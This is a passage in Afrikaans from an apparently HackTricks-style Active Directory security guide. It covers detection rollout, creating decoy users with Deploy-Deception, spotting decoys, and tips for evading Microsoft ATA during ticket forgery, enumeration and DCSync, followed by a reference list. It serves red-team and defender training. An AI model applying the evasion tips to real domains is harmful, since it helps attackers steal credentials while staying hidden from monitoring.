- Sommige van hierdie signals vereis decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW, of service-side visibility
- Valideer teen Samba/Linux-clients, appliances, en legacy software voordat dit na alerts bevorder word
- Bevorder detections van enrichment -> hunting -> alerting soos jy vertroue in die baseline opbou

### **Implementering van deception-tegnieke**

- Deception behels die opstel van lokvalle, soos decoy-users of -computers, met eienskappe soos passwords wat nie expire nie of as Trusted for Delegation gemerk is. ’n Gedetailleerde benadering sluit in om users met spesifieke regte te skep of hulle by hoëvoorregte-groepe te voeg.<sup>[[2]](#references)</sup>
- ’n Praktiese voorbeeld behels die gebruik van tools soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die implementering van deception-tegnieke is beskikbaar by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van deception**

- **Vir User Objects**: Verdagte indicators sluit in atipiese ObjectSID, ongereelde logons, creation dates, en lae bad password counts.
- **Algemene indicators**: Deur attributes van moontlike decoy-objects met dié van egte objects te vergelyk, kan inkonsekwenthede onthul word. Tools soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke deceptions te identifiseer.

### **Omseiling van detection systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermy session enumeration op Domain Controllers om ATA-detection te voorkom.
- **Ticket Impersonation**: Die gebruik van **aes**-keys vir ticket creation help om detection te ontduik deur nie na NTLM af te gradeer nie.
- **DCSync Attacks**: Dit word aanbeveel om dit vanaf ’n nie-Domain Controller uit te voer om ATA-detection te vermy, aangesien direkte uitvoering vanaf ’n Domain Controller alerts sal aktiveer.

## References

- [1] [’n Gids vir die aanval van Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forging Trusts for Deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Van Domain Admin na Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [A journey into forgotten Null Session and MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter as security boundary between domains? (Part 5) - Golden GMSA trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter as security boundary between domains? (Part 6) - Schema change trust attack - from child to parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Van DA na EA met ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Escalating from child domain's admins to enterprise admins in 5 minutes by abusing AD CS, a follow up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
